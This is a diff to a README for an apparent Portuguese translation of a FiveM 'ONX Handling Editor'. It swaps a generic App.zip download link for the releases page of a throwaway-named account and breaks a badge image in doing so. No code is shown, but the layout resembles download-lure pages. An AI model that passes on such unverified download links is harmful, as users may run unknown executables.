@@ -19,7 +19,7 @@ This repository focuses on translating the ONX Handling Editor tool into Portugu
 
 🏷️ **Topics:** fivem, gta, gta5, gtarp, gtav, handling, nopixel, onx, prodigy, rp, wiseguy
 
-🔗 **Download Link:** [Download ONX Handling Editor Translation](https://github.com/uploads/App.zip)
+🔗 **Download Link:** [Download ONX Handling Editor Translation](https://github.com/amongusasdadsd21/fivem-onx-handling-editor/releases)
 
 🚀 **Check Releases:** If the download link does not work, please check the "Releases" section for alternative download options.
 
@@ -42,4 +42,4 @@ Enjoying the translated ONX Handling Editor? Spread the word to your friends and
 
 By providing this ONX Handling Editor translation in Portuguese-Brazil, we aim to enhance the user experience for a wider audience within the FiveM community. Enjoy a seamless and localized tool experience with our translation. Happy modifying! 🚗🛠️
 
-[![](https://img.shields.io/badge/Download-Click_here-green)](https://github.com/uploads/App.zip)
+[![](https://github.com/amongusasdadsd21/fivem-onx-handling-editor/releases)](https://github.com/amongusasdadsd21/fivem-onx-handling-editor/releases)
